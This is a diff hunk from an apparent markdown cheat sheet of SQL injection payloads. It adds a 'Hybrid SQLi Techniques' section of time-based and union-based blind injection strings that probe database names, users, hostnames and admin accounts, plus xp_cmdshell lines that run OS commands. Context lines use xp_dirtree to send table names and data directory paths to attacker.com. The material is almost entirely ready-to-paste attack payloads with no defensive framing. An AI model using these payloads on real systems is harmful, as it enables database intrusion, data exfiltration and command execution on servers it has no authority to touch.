@@ -519,4 +519,33 @@ Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database type
 - `1;EXEC master.dbo.xp_dirtree '//attacker.com/'+(SELECT table_name FROM information_schema.tables LIMIT 1)--`
 - `1;EXEC master.dbo.xp_dirtree '//attacker.com/'+(SELECT @@datadir)--`
 
+---
 
+## 📋 Hybrid SQLi Techniques
+
+### Common Hybrid SQLi Payloads
+- `1' AND SLEEP(5) -- `
+- `1' OR IF(1=1, SLEEP(5), 0) -- `
+- `1; EXEC xp_cmdshell('ping example.com')--`
+- `1' UNION SELECT 1,2,3 WHERE 1=IF((LENGTH(DATABASE())>5),SLEEP(5),0)--`
+- `1' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))=65,SLEEP(5),0)--`
+- `1' UNION SELECT NULL,NULL,NULL WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))=65--`
+- `1' UNION SELECT NULL,NULL,NULL WHERE 1=IF((SELECT DATABASE()) LIKE 'a%', SLEEP(5), 0)--`
+- `1' AND IF(ORD(MID((SELECT @@version),1,1))>80,SLEEP(5),0)--`
+- `1' UNION SELECT IF((SELECT COUNT(*) FROM information_schema.tables)>5,SLEEP(5),0),NULL,NULL--`
+- `1' UNION SELECT IF(EXISTS(SELECT * FROM users WHERE username='admin'),SLEEP(5),0),NULL,NULL--`
+
+### Advanced Hybrid SQLi Techniques
+- `1' AND IF(EXISTS(SELECT table_name FROM information_schema.tables WHERE table_name='users'),SLEEP(5),0)--`
+- `1' UNION SELECT IF((SELECT LENGTH(USER()))>5,SLEEP(5),0),NULL,NULL--`
+- `1' AND IF(ASCII(SUBSTRING((SELECT @@hostname),1,1))=104,SLEEP(5),0)--`
+- `1' UNION SELECT IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(5),0),NULL,NULL--`
+- `1' AND IF(EXISTS(SELECT 1 FROM dual WHERE database() LIKE '%test%'),SLEEP(5),0)--`
+- `1; WAITFOR DELAY '0:0:5' -- `
+- `1; IF EXISTS(SELECT 1 FROM users WHERE username='admin') WAITFOR DELAY '0:0:5' -- `
+- `1' UNION SELECT NULL,NULL,NULL WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--`
+- `1' UNION SELECT IF(EXISTS(SELECT * FROM mysql.user WHERE user='root'),SLEEP(5),0),NULL,NULL--`
+- `1; EXEC xp_cmdshell('whoami')--`
+
+
+---
